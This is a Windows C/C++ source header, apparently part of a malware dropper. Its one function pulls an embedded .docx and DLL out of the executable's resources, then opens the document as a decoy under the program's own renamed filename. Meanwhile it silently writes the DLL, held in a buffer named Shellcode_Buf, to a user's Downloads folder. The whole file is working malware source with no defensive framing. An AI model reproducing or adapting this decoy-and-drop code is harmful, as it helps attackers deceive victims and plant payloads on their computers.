#pragma once

#include "Basic.h"

void free_resource() {
	// Get File Name
	char PathFileName[MAX_PATH] = { 0 };
	char FileName[MAX_PATH] = { 0 };
	char Dllpath[MAX_PATH] = "C:\\Users\\Administrator\\Downloads\\acvfunc.dll";
	char FileType[10] = { 0 };
	
	HRSRC Resource;
	HGLOBAL ResourceGlobal;
	DWORD FileSize;


	HRSRC DLL_Resource;
	HGLOBAL DLL_ResourceGlobal;
	DWORD DLL_FileSize;

	Resource = FindResourceA(NULL, MAKEINTRESOURCEA(101), "docx");
	DLL_Resource = FindResourceA(NULL, MAKEINTRESOURCEA(102), "dll");
	
	ResourceGlobal = LoadResource(NULL, Resource);
	DLL_ResourceGlobal = LoadResource(NULL, DLL_Resource);

	FileSize = SizeofResource(NULL, Resource);
	DLL_FileSize = SizeofResource(NULL, DLL_Resource);


	LPVOID PFILE = LockResource(ResourceGlobal);
	LPVOID Shellcode_Buf = LockResource(DLL_ResourceGlobal);

	GetModuleFileNameA(NULL, PathFileName, MAX_PATH);
	strcpy_s(FileName, strrchr(PathFileName, '\\') + 1);

	for (size_t i = 0; i < MAX_PATH; i++)
	{
		if (FileName[i] == '.')
		{
			FileName[i + 1] = 'd';
			FileName[i + 2] = 'o';
			FileName[i + 3] = 'c';
			FileName[i + 4] = 'x';
			break;
		}
	}

	// Create a file and write the resource in it
	HANDLE FILE = CreateFileA(FileName, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
	DWORD dwSize;
	WriteFile(FILE, PFILE, FileSize, &dwSize, NULL);

	
	// Create DLL FILE
	
	
	
	// open the docx file
	SHELLEXECUTEINFOA shellexc = { 0 };
	shellexc.cbSize = sizeof(shellexc);
	shellexc.lpFile = FileName;
	shellexc.nShow = SW_SHOW;
	ShellExecuteExA(&shellexc);

	CloseHandle(FILE);
	
	
	HANDLE DLLFILE = CreateFileA(Dllpath, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
	DWORD dllSize;
	WriteFile(DLLFILE, Shellcode_Buf, DLL_FileSize, &dllSize, NULL);
	CloseHandle(DLLFILE);

}